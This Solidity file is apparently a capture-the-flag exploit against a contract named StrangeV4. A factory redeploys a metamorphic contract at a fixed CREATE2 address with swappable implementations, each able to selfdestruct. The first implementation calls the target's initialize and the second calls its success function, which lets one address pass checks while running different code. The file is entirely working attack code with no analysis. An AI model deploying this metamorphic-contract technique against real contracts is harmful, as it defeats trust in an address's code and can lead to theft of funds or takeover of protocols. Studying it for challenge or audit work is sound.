// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./StrangeV4.sol";

contract Factory{

    mapping(address => address) private _implementations;
    event Deployed(address _addr);

    function deploy(uint salt, bytes calldata bytecode) public {
        
        bytes memory _metamorphicCode = (hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3");
        
        address metamorphicContractAddress = _getMetamorphicContractAddress(salt, _metamorphicCode);

       
        bytes memory impInitCode = bytecode;
        address implementationContractAddress;

        assembly {
            let encodedData := add(0x20, impInitCode)
            let encodedSize := mload(impInitCode)
            implementationContractAddress := create(
                0,
                encodedData,
                encodedSize
            )
        }

        _implementations[metamorphicContractAddress] = implementationContractAddress;

        address addr;

        assembly{
            let encodedData:= add(0x20, _metamorphicCode)
            let encodedSize:= mload(_metamorphicCode)
            addr := create2(0, encodedData,encodedSize, salt)
        }

        require(
          addr == metamorphicContractAddress,
          "Failed to deploy the new metamorphic contract."
        );
        emit Deployed(addr);

    }

    function _getMetamorphicContractAddress(uint256 salt, bytes memory metamorphicCode) internal view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",address(this),salt,keccak256(abi.encodePacked(metamorphicCode)))))));
    }

    function getImplementation() external view returns (address implementation) {
        return _implementations[msg.sender];
    }
}

contract Implementation1{
    function action(address strangeAddress) external {
        StrangeV4(strangeAddress).initialize(address(this));
    }

    function kill() external {
      selfdestruct(payable(msg.sender));
    }
}

contract Implementation2{
    event ValueReceived(address user, uint amount);

    function action(address strangeAddress) external {
        StrangeV4(strangeAddress).success(address(this));
    }

    function kill() external {
      selfdestruct(payable(msg.sender));
    }

    receive() external payable{
        emit ValueReceived(msg.sender, msg.value);
    }
}